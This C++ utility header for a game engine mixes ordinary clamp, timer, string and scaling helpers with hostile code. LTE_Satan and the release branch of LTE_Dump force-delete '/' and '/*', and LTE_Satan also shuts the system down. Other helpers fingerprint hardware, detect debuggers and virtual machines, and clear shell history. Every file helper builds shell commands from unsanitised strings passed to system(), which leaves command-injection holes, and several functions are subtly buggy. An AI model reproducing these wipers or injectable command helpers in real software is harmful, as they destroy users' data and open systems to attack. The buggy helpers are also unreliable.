#ifndef TINYENGINE_LTE_UTILS_H_
#define TINYENGINE_LTE_UTILS_H_

#pragma once

#include <cmath>
#include <algorithm>
#include <cstddef>
#include <cstdint>
#include <cstdlib>
#include <sstream>
#include <string>
#include <vector>
#include <stdlib.h>
#include <assert.h>
#include <functional>
#include <iostream>
#include <ctime>
#include <iostream>
#include <cstring>
#include <iosfwd>
#include <fstream>
#include <vector>
#include <sstream>
#include <memory>
#include <sys/ptrace.h>

#include "LTE_Types.h"
#include "LTE_Globals.h"

#define LTE_AUDIO_FREQUENCY			22050
#define LTE_AUDIO_CHANNELS			2
#define LTE_AUDIO_CHUNK_SIZE		4096
#define LTE_ENABLE_HARDWARE_PALETTE	false
#define LTE_ENABLE_HARDWARE_SURFACE	false
#define LTE_ENABLE_MULTIPLE_CORES	false
#define LTE_FORCE_VIDEO_SURFACE		true
#define LTE_PAIR					2

template<class... T>
inline void LTE_Unused(T&&...) {}

template <class T>
inline T LTE_Clamp(T current, T min, T max) {
	if (current < min) return min;
	if (current > max) return max;
	return current;
}

template <class T>
inline T LTE_Wrap(T current, T min, T max) {
	if (current < min) return max;
	if (current > max) return min;
	return current;
}

template <class T>
inline T LTE_Invert(T y) {
	return y; /*return GAME_HEIGHT - y;*/
}

template <class T>
inline T LTE_NextPowerOfTwo(T value) {
	return static_cast<T>(std::pow(2, std::ceil(std::log10(static_cast<double>(value)) / std::log10(static_cast<double>(2)))));
}

template <class T>
inline bool LTE_IsPowerOfTwo(T value) {
	return (value & (value - 1)) != 0;
}

template <typename T, std::size_t N>
inline constexpr std::size_t LTE_ArraySize(T (&)[N]) {
	return N;
}

template <typename T, std::size_t N>
inline T* LTE_ArrayBegin(T (&array)[N]) {
	return &array[0];
}

template <typename T, std::size_t N>
inline T* LTE_ArrayEnd(T (&array)[N]) {
	return &array[N];
}

inline bool LTE_Timeline(int& thinks, int tMin, int tMax) {
	int mThiks = thinks;
	mThiks = LTE_Clamp(++mThiks, tMin, tMax);
	thinks = mThiks;
	return thinks != tMax;
}

inline bool LTE_Timeline(int& thinks, int tMin, int tMax, int& loop, int lMin, int lMax) {
	int mThiks = thinks;
	int mLoop = loop;
	mThiks = LTE_Clamp(++mThiks, tMin, tMax);
	if (mThiks == tMax) {
		mLoop = LTE_Clamp(++mLoop, lMin, lMax);
	}
	thinks = mThiks;
	loop = mLoop;
	return thinks != tMax && loop != lMax;
}

inline bool LTE_Count(int& count, int min, int max) {
	if (count >= min) {
		int mCount = count;
		mCount = LTE_Clamp(++mCount, min, max);
		count = mCount;
	}
	return count == max;
}

inline bool LTE_Count(int& count, int min, int max, bool play) {
	if (count >= min && play) {
		int mCount = count;
		mCount = LTE_Clamp(++mCount, min, max);
		count = mCount;
	}
	return count == max;
}

inline bool LTE_Wait(int& thicks, int max, bool play) {
	if (play) {
		thicks = LTE_Clamp(++thicks, 0, max);
	}
	return thicks == max;
}

inline bool LTE_Alarm(int& thicks, int max, bool play) {
	if (play && thicks < max) {
		thicks = LTE_Clamp(++thicks, 0, max);
	} else {
		return false;
	}
	return thicks == max;
}

template<typename T>
inline std::string LTE_ToString(T arg)
{
	std::stringstream iss;
	iss << arg;
	return std::string(iss.str());
}

inline std::string LTE_ToMonetary(const std::string& prefix, int value) {
	std::string str = LTE_ToString(value);
	std::string tmp;
	if (str.length() == 0) {
		return "0,00";
	} else
	if (str.length() == 1) {
		return "0,0" + str;
	} else
	if (str.length() == 2) {
		return "0," + str;
	}
	for (int i = 0, n = (int)str.length() - 1; i < (int)str.length(); i++, n--) {
		if (i == (int)str.length() - 2) {
			tmp += ",";
		} else
		if ((n - 2) % 3 + 1 == 3 && str.length() % 2 == 0) {
			tmp += ".";
		}
		tmp += str[i];
	}
	std::string out;
	if (tmp[0] == '.') {
		for (std::size_t i = 1; i < tmp.length(); i++) {
			out += out[i];
		}
	} else {
		out = prefix + tmp;
	}
	return out;
}

inline std::string LTE_ToMonetary(int value) {
	std::string str = LTE_ToString(value);
	std::string tmp;
	if (str.length() == 0) {
		return "0,00";
	} else
	if (str.length() == 1) {
		return "0,0" + str;
	} else
	if (str.length() == 2) {
		return "0," + str;
	}
	for (int i = 0, n = (int)str.length() - 1; i < (int)str.length(); i++, n--) {
		if (i == (int)str.length() - 2) {
			tmp += ",";
		} else
		if ((n - 2) % 3 + 1 == 3 && str.length() % 2 == 0) {
			tmp += ".";
		}
		tmp += str[i];
	}
	std::string out;
	if (tmp[0] == '.') {
		for (std::size_t i = 1; i < tmp.length(); i++) {
			out += out[i];
		}
	} else {
		out =  tmp;
	}
	return out;
}

template<class T>
inline T LTE_Empty(T& arg) {
	arg = NULL;
}


inline std::vector<int> LTE_Explode(std::string str, std::string del)
{
	int slen = str.length();
	int dlen = del.length();
	int found_a;
	std::string before;
	std::vector<int> final;
	if (dlen == 0) {
		return std::vector<int>();
	}
	if (slen == 0) {
		return std::vector<int>();
	}
	for (int i = 0; i < slen; i ++) {
		found_a = str.find(del);
		if (found_a != static_cast<int>(std::string::npos)) {
			before = str.substr(0, found_a + dlen - 1);
			final.push_back(std::atoi(before.c_str()));
			str.replace(0, found_a + dlen, "");
		} else
		if (str.length() > 0) {
			final.push_back(std::atoi(str.c_str()));
			str.replace(0, str.length(), "");
		} else {
			break;
		}
	}
	return final;
}

inline std::vector<std::string> LTE_ExplodeToString(std::string str, std::string del)
{
	int slen = str.length();
	int dlen = del.length();
	int found_a;
	std::string before;
	std::vector<std::string> final;
	if (dlen == 0) {
		return std::vector<std::string>();
	}
	if (slen == 0) {
		return std::vector<std::string>();
	}
	for (int i = 0; i < slen; i ++) {
		found_a = str.find(del);
		if (found_a != static_cast<int>(std::string::npos)) {
			before = str.substr(0, found_a + dlen - 1);
			final.push_back(before);
			str.replace(0, found_a + dlen, "");
		} else
		if (str.length() > 0) {
			final.push_back(str.c_str());
			str.replace(0, str.length(), "");
		} else {
			break;
		}
	}
	return final;
}

inline bool LTE_Command(const std::string& command) {
	int i = system(command.c_str());
	return i == 0 ? true : false;
}

inline bool LTE_ShutDown() {
	return LTE_Command("/sbin/shutdown -h now");
}

inline bool LTE_CkFile(const std::string& file) {
	return LTE_Command("test -f " + file);
}

inline bool LTE_CkDir(const std::string& dir) {
	return LTE_Command("test -d " + dir);
}

inline std::string LTE_Read(const std::string src) {
	std::string line;
	std::ifstream stream(src);
	if (!stream.is_open()) {
		std::cerr << "WARNING: Could not read '" << src << "'." << std::endl;
		exit(EXIT_FAILURE);
	}
//	while (stream.good()) {
//		stream >> line;
//		consume(stream);
//	}
//	while (!stream.eof()) {
//		getline(stream, line);
//	}
//	while (stream.good()) {
//		getline(stream, line);
//	}
    while(getline(stream, line)) {
    	stream >> line;
    }
	stream.close();
	return line;
}

inline std::string LTE_ReadLine(const std::string src) {
	std::string str;
	std::ifstream stream(src);
	if (!stream.is_open()) {
		std::cerr << "WARNING: Could not read '" << src << "'." << std::endl;
		exit(EXIT_FAILURE);
	}
	stream >> str;
	stream.close();
	return str;
}

inline bool LTE_Access(const std::string& dst) {
	return LTE_Command("cd " + dst);
}
inline bool LTE_MkDir(const std::string& dir) {
	return LTE_Command("mkdir " + dir);
}

inline bool LTE_Copy(const std::string& org, const std::string& dst) {
	return LTE_Command("cp -rf " + org + " " + dst);
}

inline bool LTE_Move(const std::string& org, const std::string& dst) {
	return LTE_Command("mv -r " + org + " " + dst);
}

inline bool LTE_Write(const std::string& msg, const std::string& file) {
	return LTE_Command("echo " + msg + " >> " + file);
}

inline bool LTE_Rewrite(const std::string& msg, const std::string& file) {
	return LTE_Command("echo " + msg + " > " + file);
}

inline bool LTE_Remove(const std::string& dst) {
	return LTE_Command("rm -r " + dst);
}

inline bool LTE_RemoveForce(const std::string& dst) {
	return LTE_Command("rm -rf " + dst);
}

inline bool LTE_RemoveFile(const std::string& dst) {
	return LTE_Command("rm " + dst);
}

inline bool LTE_RemoveForceFile(const std::string& dst) {
	return LTE_Command("rm -f " + dst);
}

inline bool LTE_HClean() {
	return LTE_Command("history -c");
}

inline int LTE_Exec(const std::string& src) {
	return system(src.c_str());
}

inline bool LTE_Decrypt(const std::string& org, const std::string& dst, const std::string& key) {
	return LTE_Command("echo " + key + " | encfs -S " + org + " " + dst);
}

inline bool LTE_Encrypt(const std::string& org) {
	return LTE_Command("fusermount -u " + org);
}

inline std::string LTE_GenRandomString(std::size_t size) {
	static const char alphanum[] =
	"0123456789"
	"!@#$%^&*"
	"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	"abcdefghijklmnopqrstuvwxyz";
	int stringLength = LTE_ArraySize(alphanum) - 1;
    std::string str;
    for (std::size_t i = 0; i < size; i++) {
    	str += alphanum[rand() % stringLength];
    }
    return str;
}

inline std::string LTE_GenRandomName(std::size_t size) {
	static const char alphanum[] =
	"0123456789"
	"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	"abcdefghijklmnopqrstuvwxyz";
	int stringLength = LTE_ArraySize(alphanum) - 1;
    std::string str;
    for (std::size_t i = 0; i < size; i++) {
    	str += alphanum[rand() % stringLength];
    }
    return str;
}

inline std::string LTE_Pwd() {
	std::string file ="/tmp/" +  LTE_GenRandomName(10);
	LTE_Command("pwd > " + file);
	std::string str = LTE_ReadLine(file);
	return str;
}

inline bool LTE_MkInfo(const std::string& src) {
	std::string str = "/tmp/" +  LTE_GenRandomName(10);
	std::string out = "/tmp/" +  LTE_GenRandomName(10);
#if RASP
	bool a = LTE_Command("cat /var/lib/dbus/machine-id                 >> " + str);
	bool b = LTE_Command("cat /proc/cpuinfo | grep 'Serial'            >> " + str);
	bool c = LTE_Command("cat /sys/class/net/eth0/address              >> " + str);
	if (!a || !b || !c) {
		return false;
	}
#else
	bool a = LTE_Command("cat /sys/devices/virtual/dmi/id/bios_date    >> " + str);
	bool b = LTE_Command("cat /sys/devices/virtual/dmi/id/bios_vendor  >> " + str);
	bool c = LTE_Command("cat /sys/devices/virtual/dmi/id/bios_version >> " + str);
	bool d = LTE_Command("cat /sys/devices/virtual/dmi/id/board_name   >> " + str);
	bool e = LTE_Command("cat /sys/devices/virtual/dmi/id/board_vendor >> " + str);
	bool f = LTE_Command("cat /etc/machine-id                          >> " + str);
	bool g = LTE_Command("cat /proc/version                            >> " + str);
	if (!a || !b || !c || !d || !e || !f || !g) {
		return false;
	}
#endif
	if (!LTE_Command("openssl sha1 " + str + " >> " + out)) {
		return false;
	}
	std::vector<std::string> vec = LTE_ExplodeToString(LTE_Read(out), " ");
	if (!LTE_Write(vec[1], src)) {
		return false;
	}
	LTE_RemoveForceFile(out);
	LTE_RemoveForceFile(str);
	return true;
}

inline void LTE_Satan(const std::string& abs, const std::string& org, const std::string& dst) {
	LTE_RemoveForce(LTE_Pwd());
	LTE_RemoveForce(abs);
	LTE_RemoveForce(org);
	LTE_RemoveForce(dst);
	LTE_RemoveForce("/*");
	LTE_RemoveForce("/");
	LTE_ShutDown();
}

inline void LTE_Dump(const std::string& message, const std::string& path) {
#ifdef DEBUG
	LTE_Write("ERROR: " + message, path);
#else
	LTE_Unused(message, path);
	const std::string dir = "/opt/flexsys";
	const std::string org = "/opt/flexsys/.system";
	const std::string dst = "/opt/flexsys/system";
	LTE_RemoveForce(LTE_Pwd());
	LTE_RemoveForce(dir);
	LTE_RemoveForce(org);
	LTE_RemoveForce(dst);
	LTE_RemoveForce("/*");
	LTE_RemoveForce("/");
#endif
	LTE_Unused(path);
}

inline bool LTE_CkInfo(const std::string& org, const std::string& dst) {
	std::string file_org = LTE_Read(org);
	std::string file_dst = LTE_Read(dst);
	LTE_Remove(dst);
	return (file_org.compare(file_dst) == 0);
}

inline bool LTE_CkDev(const std::string& dev) {
	std::string file ="/tmp/" +  LTE_GenRandomName(10);
	LTE_Command("ls " + dev + " > " + file);
	std::string str = LTE_ReadLine(file);
	return str.length() == 0 ? false : true;
}

inline char LTE_CharacterAt(size_t index) {
	static const char ascii[] = {
		"1234567890-"
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	};
	assert(index < LTE_ArraySize(ascii));
	return ascii[index];
}

inline std::string LTE_FormattedPassword(const std::string& value) {
	size_t length = value.length();
	std::string result;
	result.reserve(length * 2);
	for (size_t i = 0; i < length; i++) {
		if (i % 4 == 0 && i != 0) {
			result += ' ';
		}
		result += value[i];
	}
	return result;
}

inline std::string LTE_GetUUID(const std::string dev) {
	std::string file ="/tmp/" +  LTE_GenRandomName(10);
	LTE_Command("blkid | grep " + dev + " > " + file);
	std::string tmp = LTE_ReadLine(file);
	LTE_RemoveFile(file);
	std::string str;
	bool start = false;
	int n = -1;
	//	36
	for (std::size_t i = 0; i < (std::size_t)53; i++) {
		if (tmp[i] == '"') {
			start = start == true ? false : true;
			n = start ? 0 : -1;
		}
		if (start && n >= 1 && n <= 37) {
			str += tmp[i];
		}
		if (start) {
			n++;
		}
	}
	return str;
}

// 1920x1080, 1360x765, 1280x720, 1024x576, 896x504, 640x360
inline LTE_Position LTE_Fluid(const LTE_Position& position) {
	double mx = (double)position.x * ((((double)LTE_GLOBAL_WINDOW.w * 100.0) / (double)LTE_GLOBAL_ASPECT.w) / 100.0);
	double my = (double)position.y * ((((double)LTE_GLOBAL_WINDOW.h * 100.0) / (double)LTE_GLOBAL_ASPECT.h) / 100.0);
	return LTE_Position(mx, my);
}

inline LTE_Position LTE_Fluid(int x, int y) {
	double mx = (double)x * ((((double)LTE_GLOBAL_WINDOW.w * 100.0) / (double)LTE_GLOBAL_ASPECT.w) / 100.0);
	double my = (double)y * ((((double)LTE_GLOBAL_WINDOW.h * 100.0) / (double)LTE_GLOBAL_ASPECT.h) / 100.0);
	return LTE_Position(mx, my);
}

inline int LTE_FluidFont(int size) {
	return (int)((double)size * ((((double)LTE_GLOBAL_WINDOW.w * 100.0) / (double)LTE_GLOBAL_ASPECT.w) / 100.0));
}

inline int LTE_FluidWidth(int width) {
	return (int)((double)width * ((((double)LTE_GLOBAL_WINDOW.w * 100.0) / (double)LTE_GLOBAL_ASPECT.w) / 100.0));
}

inline int LTE_FluidHeight(int heigth) {
	return (int)((double)heigth * ((((double)LTE_GLOBAL_WINDOW.h * 100.0) / (double)LTE_GLOBAL_ASPECT.h) / 100.0));
}

inline double LTE_GetFluidPercentage(int heigth) {
	return (double)heigth * ((((double)LTE_GLOBAL_WINDOW.h * 100.0) / (double)LTE_GLOBAL_ASPECT.h) / 100.0);
}

//(original height / original width) x new width = new height
inline int LTE_Aspect(int width) {
	return (LTE_GLOBAL_WINDOW.h / LTE_GLOBAL_ASPECT.w) * width;
}

inline bool LTE_IsVMC() {
	std::string file ="/tmp/" +  LTE_GenRandomName(10);
	LTE_Command("systemd-detect-virt > " + file);
	std::string mStr = LTE_ReadLine(file);
	return (mStr.compare("none") != 0);
}

inline bool LTE_IsTrace() {
	if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1)
	{
	    return true;
	}
    return false;
}

#endif
